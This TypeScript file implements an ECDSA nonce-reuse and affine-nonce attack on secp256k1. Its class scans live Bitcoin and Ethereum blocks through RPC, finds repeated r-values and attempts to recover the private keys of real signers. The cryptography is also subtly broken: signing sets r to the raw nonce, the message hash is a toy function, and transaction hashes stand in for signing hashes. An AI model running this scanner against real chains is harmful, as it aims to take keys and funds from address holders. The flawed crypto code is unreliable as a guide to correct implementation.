/**
 * ECDSA Affine Nonce Attack Implementation
 * JavaScript/TypeScript port of the Python module
 */

// Elliptic curve parameters for secp256k1
const CURVE_ORDER = BigInt("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141");
const CURVE_P = BigInt("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F");

export interface SignatureData {
  message: Uint8Array;
  messageHash: bigint;
  r: bigint;
  s: bigint;
  nonce?: bigint;
  txHash?: string;
  blockNumber?: number;
  fromAddress?: string;
  recoveryId?: number;
  scriptType?: string;
  signatureType?: string;
}

export interface ChainAnalysisResult {
  blocksAnalyzed: number;
  transactionsProcessed: number;
  signaturesExtracted: number;
  potentialVulnerabilities: Array<{
    type: string;
    rValue?: bigint;
    signatures: SignatureData[];
    recoveredPrivateKeys?: bigint[];
    severity: string;
    description: string;
  }>;
  rValueReuseCount: number;
  uniqueAddresses: number;
  analysisDuration: number;
  errorCount: number;
}

export interface AttackResult {
  success: boolean;
  recoveredPrivateKey?: bigint;
  originalPrivateKey?: bigint;
  signaturesUsed?: SignatureData[];
  affineParams?: { a: number; b: number };
  errorMessage?: string;
}

export class ECDSAAffineAttack {
  private curveOrder: bigint;
  private chainstackUrl?: string;
  private chainstackApiKey?: string;

  constructor(chainstackUrl?: string, chainstackApiKey?: string) {
    this.curveOrder = CURVE_ORDER;
    this.chainstackUrl = chainstackUrl;
    this.chainstackApiKey = chainstackApiKey;
  }

  /**
   * Analyze blockchain signatures for vulnerabilities
   */
  async analyzeBlockchainSignatures(
    blockRange: [number, number],
    maxBlocks: number = 1000,
    progressCallback?: (progress: number, current: number, total: number) => void
  ): Promise<ChainAnalysisResult> {
    const startTime = Date.now();
    const [startBlock, endBlock] = blockRange;
    const actualEndBlock = Math.min(endBlock, startBlock + maxBlocks - 1);
    const totalBlocks = actualEndBlock - startBlock + 1;

    const result: ChainAnalysisResult = {
      blocksAnalyzed: 0,
      transactionsProcessed: 0,
      signaturesExtracted: 0,
      potentialVulnerabilities: [],
      rValueReuseCount: 0,
      uniqueAddresses: 0,
      analysisDuration: 0,
      errorCount: 0
    };

    const signatures: SignatureData[] = [];
    const rValueMap = new Map<string, SignatureData[]>();
    const addressSet = new Set<string>();

    try {
      // Process blocks in batches
      for (let currentBlock = startBlock; currentBlock <= actualEndBlock; currentBlock++) {
        try {
          const blockData = await this.getBlockData(currentBlock);
          if (!blockData) {
            result.errorCount++;
            continue;
          }

          result.blocksAnalyzed++;
          
          // Process transactions in the block
          for (const tx of blockData.transactions) {
            result.transactionsProcessed++;
            
            const sigData = this.extractSignatureFromTransaction(tx);
            if (sigData) {
              signatures.push(sigData);
              result.signaturesExtracted++;
              
              if (sigData.fromAddress) {
                addressSet.add(sigData.fromAddress);
              }

              // Track r-value reuse
              const rKey = sigData.r.toString();
              if (rValueMap.has(rKey)) {
                rValueMap.get(rKey)!.push(sigData);
              } else {
                rValueMap.set(rKey, [sigData]);
              }
            }
          }

          // Report progress
          if (progressCallback) {
            const progress = ((currentBlock - startBlock + 1) / totalBlocks) * 100;
            progressCallback(progress, currentBlock - startBlock + 1, totalBlocks);
          }

        } catch (error) {
          result.errorCount++;
          console.error(`Error processing block ${currentBlock}:`, error);
        }
      }

      // Analyze for vulnerabilities
      result.uniqueAddresses = addressSet.size;
      
      // Check for r-value reuse
      for (const [rValue, sigList] of rValueMap.entries()) {
        if (sigList.length > 1) {
          result.rValueReuseCount++;
          
          // Attempt private key recovery from nonce reuse
          const recoveredKeys = this.recoverPrivateKeysFromNonceReuse(sigList);
          
          result.potentialVulnerabilities.push({
            type: 'r_value_reuse',
            rValue: BigInt(rValue),
            signatures: sigList,
            recoveredPrivateKeys: recoveredKeys,
            severity: 'CRITICAL',
            description: `R-value ${rValue} reused ${sigList.length} times - nonce reuse detected`
          });
        }
      }

    } catch (error) {
      result.errorCount++;
      console.error('Error during blockchain analysis:', error);
    }

    result.analysisDuration = Date.now() - startTime;
    return result;
  }

  /**
   * Recover private key from affinely related nonces
   */
  recoverPrivateKey(
    signatures: SignatureData[],
    a: number,
    b: number
  ): AttackResult {
    if (signatures.length < 2) {
      return {
        success: false,
        errorMessage: "Need at least 2 signatures for attack"
      };
    }

    try {
      const sig1 = signatures[0];
      const sig2 = signatures[1];
      const z1 = sig1.messageHash;
      const z2 = sig2.messageHash;
      const r1 = sig1.r;
      const r2 = sig2.r;
      const s1 = sig1.s;
      const s2 = sig2.s;

      // Validate signature components
      if (r1 === 0n || s1 === 0n || r2 === 0n || s2 === 0n) {
        return {
          success: false,
          errorMessage: "Invalid signature components (zero values detected)"
        };
      }

      // Apply the recovery formula: priv = (a*s2*z1 - s1*z2 + b*s1*s2) / (r2*s1 - a*r1*s2) mod n
      const numerator = this.modulo(
        BigInt(a) * s2 * z1 - s1 * z2 + BigInt(b) * s1 * s2,
        this.curveOrder
      );
      
      const denominator = this.modulo(
        r2 * s1 - BigInt(a) * r1 * s2,
        this.curveOrder
      );

      if (denominator === 0n) {
        return {
          success: false,
          errorMessage: "Denominator is zero - signatures may not have affine nonce relationship"
        };
      }

      const denominatorInv = this.modInverse(denominator, this.curveOrder);
      const recoveredPrivateKey = this.modulo(denominatorInv * numerator, this.curveOrder);

      if (recoveredPrivateKey === 0n) {
        return {
          success: false,
          errorMessage: "Recovered private key is zero - invalid result"
        };
      }

      return {
        success: true,
        recoveredPrivateKey,
        signaturesUsed: signatures.slice(0, 2),
        affineParams: { a, b }
      };

    } catch (error) {
      return {
        success: false,
        errorMessage: `Attack failed with error: ${error}`
      };
    }
  }

  /**
   * Generate vulnerable signatures for testing
   */
  generateVulnerableSignatures(
    a: number = 2,
    b: number = 1,
    privateKey?: bigint
  ): { signatures: SignatureData[]; privateKey: bigint } {
    if (!privateKey) {
      privateKey = this.generateRandomBigInt(this.curveOrder);
    }

    const message1 = new TextEncoder().encode("Affinely related nonces are insecure");
    const message2 = new TextEncoder().encode("This is a vulnerability demonstration");

    const k1 = this.generateRandomBigInt(this.curveOrder);
    const k2 = this.modulo(BigInt(a) * k1 + BigInt(b), this.curveOrder);

    const sig1 = this.signWithNonce(privateKey, message1, k1);
    const sig2 = this.signWithNonce(privateKey, message2, k2);

    return {
      signatures: [sig1, sig2],
      privateKey
    };
  }

  /**
   * Recover private keys from nonce reuse
   */
  private recoverPrivateKeysFromNonceReuse(signatures: SignatureData[]): bigint[] {
    const recoveredKeys: bigint[] = [];

    for (let i = 0; i < signatures.length; i++) {
      for (let j = i + 1; j < signatures.length; j++) {
        try {
          const sig1 = signatures[i];
          const sig2 = signatures[j];

          // k = (z1 - z2) / (s1 - s2) mod n
          const zDiff = this.modulo(sig1.messageHash - sig2.messageHash, this.curveOrder);
          const sDiff = this.modulo(sig1.s - sig2.s, this.curveOrder);

          if (sDiff !== 0n) {
            const sDiffInv = this.modInverse(sDiff, this.curveOrder);
            const k = this.modulo(zDiff * sDiffInv, this.curveOrder);

            // Recover private key: priv = (s*k - z) / r mod n
            if (sig1.r !== 0n) {
              const rInv = this.modInverse(sig1.r, this.curveOrder);
              const priv = this.modulo((sig1.s * k - sig1.messageHash) * rInv, this.curveOrder);
              
              if (priv !== 0n) {
                recoveredKeys.push(priv);
              }
            }
          }
        } catch (error) {
          // Continue with next pair
          continue;
        }
      }
    }

    return [...new Set(recoveredKeys.map(k => k.toString()))].map(k => BigInt(k));
  }

  /**
   * Sign message with specific nonce (for testing)
   */
  private signWithNonce(privateKey: bigint, message: Uint8Array, nonce: bigint): SignatureData {
    const messageHash = this.hashMessage(message);
    
    // This is a simplified implementation - in practice would use proper EC operations
    const r = this.modulo(nonce, this.curveOrder);
    const nonceInv = this.modInverse(nonce, this.curveOrder);
    const s = this.modulo(nonceInv * (messageHash + r * privateKey), this.curveOrder);

    return {
      message,
      messageHash,
      r,
      s,
      nonce
    };
  }

  /**
   * Extract signature from transaction data
   */
  private extractSignatureFromTransaction(tx: any): SignatureData | null {
    try {
      // Handle Bitcoin transactions
      if (tx.vin && Array.isArray(tx.vin)) {
        const signatures: SignatureData[] = [];
        
        for (const input of tx.vin) {
          if (input.scriptSig && input.scriptSig.hex) {
            const sigData = this.extractBitcoinSignature(input.scriptSig.hex, tx.txid);
            if (sigData) {
              return sigData; // Return first valid signature found
            }
          }
          
          // Handle witness data for SegWit transactions
          if (input.txinwitness && Array.isArray(input.txinwitness)) {
            for (const witnessItem of input.txinwitness) {
              if (witnessItem && witnessItem.length > 140) { // Likely a signature
                const sigData = this.extractBitcoinSignature(witnessItem, tx.txid);
                if (sigData) {
                  return sigData;
                }
              }
            }
          }
        }
      }

      // Handle Ethereum transactions
      if (tx.v !== undefined && tx.r !== undefined && tx.s !== undefined) {
        const r = typeof tx.r === 'string' ? BigInt(tx.r) : BigInt(tx.r);
        const s = typeof tx.s === 'string' ? BigInt(tx.s) : BigInt(tx.s);
        const hash = typeof tx.hash === 'string' ? tx.hash : '';
        
        if (r === 0n || s === 0n) return null;
        
        const messageHash = BigInt(hash) % this.curveOrder;
        const hashBytes = new Uint8Array(32);
        
        return {
          message: hashBytes,
          messageHash,
          r,
          s,
          txHash: hash,
          blockNumber: tx.blockNumber ? parseInt(tx.blockNumber) : undefined,
          fromAddress: tx.from,
          scriptType: 'ethereum',
          signatureType: 'ecdsa'
        };
      }

      return null;
    } catch (error) {
      console.error('Error extracting signature:', error);
      return null;
    }
  }

  /**
   * Extract ECDSA signature from Bitcoin script hex
   */
  private extractBitcoinSignature(scriptHex: string, txid: string): SignatureData | null {
    try {
      // Remove 0x prefix if present
      const hex = scriptHex.startsWith('0x') ? scriptHex.slice(2) : scriptHex;
      
      // Look for DER-encoded signatures (starts with 0x30)
      const derMatches = hex.match(/30[0-9a-f]{4,140}/gi);
      if (!derMatches || derMatches.length === 0) {
        return null;
      }

      const derSig = derMatches[0];
      
      // Parse DER signature
      const signature = this.parseDERSignature(derSig);
      if (!signature) {
        return null;
      }

      // Create a mock message hash (in real implementation, would calculate sighash)
      const messageHash = this.hashMessage(new TextEncoder().encode(txid));
      const messageBytes = new TextEncoder().encode(txid);

      return {
        message: messageBytes,
        messageHash,
        r: signature.r,
        s: signature.s,
        txHash: txid,
        scriptType: 'bitcoin',
        signatureType: 'ecdsa'
      };
    } catch (error) {
      console.error('Error extracting Bitcoin signature:', error);
      return null;
    }
  }

  /**
   * Parse DER-encoded ECDSA signature
   */
  private parseDERSignature(derHex: string): { r: bigint; s: bigint } | null {
    try {
      const bytes = this.hexToBytes(derHex);
      
      if (bytes.length < 6 || bytes[0] !== 0x30) {
        return null;
      }

      let offset = 2; // Skip 0x30 and length byte
      
      // Parse r value
      if (bytes[offset] !== 0x02) return null;
      offset++;
      
      const rLength = bytes[offset];
      offset++;
      
      const rBytes = bytes.slice(offset, offset + rLength);
      const r = this.bytesToBigInt(rBytes);
      offset += rLength;
      
      // Parse s value
      if (bytes[offset] !== 0x02) return null;
      offset++;
      
      const sLength = bytes[offset];
      offset++;
      
      const sBytes = bytes.slice(offset, offset + sLength);
      const s = this.bytesToBigInt(sBytes);
      
      if (r === 0n || s === 0n || r >= this.curveOrder || s >= this.curveOrder) {
        return null;
      }
      
      return { r, s };
    } catch (error) {
      console.error('Error parsing DER signature:', error);
      return null;
    }
  }

  /**
   * Convert hex string to bytes
   */
  private hexToBytes(hex: string): Uint8Array {
    const bytes = new Uint8Array(hex.length / 2);
    for (let i = 0; i < hex.length; i += 2) {
      bytes[i / 2] = parseInt(hex.substr(i, 2), 16);
    }
    return bytes;
  }

  /**
   * Convert bytes to BigInt
   */
  private bytesToBigInt(bytes: Uint8Array): bigint {
    let result = 0n;
    for (let i = 0; i < bytes.length; i++) {
      result = (result << 8n) + BigInt(bytes[i]);
    }
    return result;
  }

  /**
   * Fetch block data from blockchain
   */
  private async getBlockData(blockNumber: number): Promise<any> {
    if (!this.chainstackUrl) {
      throw new Error('Chainstack URL not configured');
    }

    try {
      // Check if this is a Bitcoin node URL
      const isBitcoinNode = this.chainstackUrl.includes('bitcoin') || this.chainstackUrl.includes('btc');
      
      if (isBitcoinNode) {
        // Use Bitcoin RPC methods
        const response = await fetch(this.chainstackUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            ...(this.chainstackApiKey && { 'Authorization': `Bearer ${this.chainstackApiKey}` })
          },
          body: JSON.stringify({
            jsonrpc: '1.0',
            method: 'getblock',
            params: [await this.getBitcoinBlockHash(blockNumber), 2], // verbosity 2 for full transaction data
            id: 1
          })
        });

        const data = await response.json();
        if (data.error) {
          console.error(`Bitcoin RPC error:`, data.error);
          return null;
        }
        return data.result;
      } else {
        // Use Ethereum RPC methods
        const response = await fetch(this.chainstackUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            ...(this.chainstackApiKey && { 'Authorization': `Bearer ${this.chainstackApiKey}` })
          },
          body: JSON.stringify({
            jsonrpc: '2.0',
            method: 'eth_getBlockByNumber',
            params: [`0x${blockNumber.toString(16)}`, true],
            id: 1
          })
        });

        const data = await response.json();
        if (data.error) {
          console.error(`Ethereum RPC error:`, data.error);
          return null;
        }
        return data.result;
      }
    } catch (error) {
      console.error(`Error fetching block ${blockNumber}:`, error);
      return null;
    }
  }

  /**
   * Get Bitcoin block hash by height
   */
  private async getBitcoinBlockHash(blockHeight: number): Promise<string> {
    try {
      const response = await fetch(this.chainstackUrl!, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          ...(this.chainstackApiKey && { 'Authorization': `Bearer ${this.chainstackApiKey}` })
        },
        body: JSON.stringify({
          jsonrpc: '1.0',
          method: 'getblockhash',
          params: [blockHeight],
          id: 1
        })
      });

      const data = await response.json();
      if (data.error) {
        throw new Error(`Error getting block hash: ${data.error.message}`);
      }
      return data.result;
    } catch (error) {
      console.error(`Error getting Bitcoin block hash:`, error);
      throw error;
    }
  }

  // Helper functions
  private modulo(a: bigint, m: bigint): bigint {
    return ((a % m) + m) % m;
  }

  private modInverse(a: bigint, m: bigint): bigint {
    // Extended Euclidean Algorithm
    let [oldR, r] = [a, m];
    let [oldS, s] = [1n, 0n];

    while (r !== 0n) {
      const quotient = oldR / r;
      [oldR, r] = [r, oldR - quotient * r];
      [oldS, s] = [s, oldS - quotient * s];
    }

    return oldS < 0n ? oldS + m : oldS;
  }

  private generateRandomBigInt(max: bigint): bigint {
    const bytes = Math.ceil(max.toString(16).length / 2);
    const array = new Uint8Array(bytes);
    crypto.getRandomValues(array);
    
    let result = 0n;
    for (let i = 0; i < array.length; i++) {
      result = (result << 8n) + BigInt(array[i]);
    }
    
    return result % max;
  }

  private hashMessage(message: Uint8Array): bigint {
    // Simplified hash - in practice would use SHA-256
    let hash = 0n;
    for (let i = 0; i < message.length; i++) {
      hash = (hash * 256n + BigInt(message[i])) % this.curveOrder;
    }
    return hash;
  }
}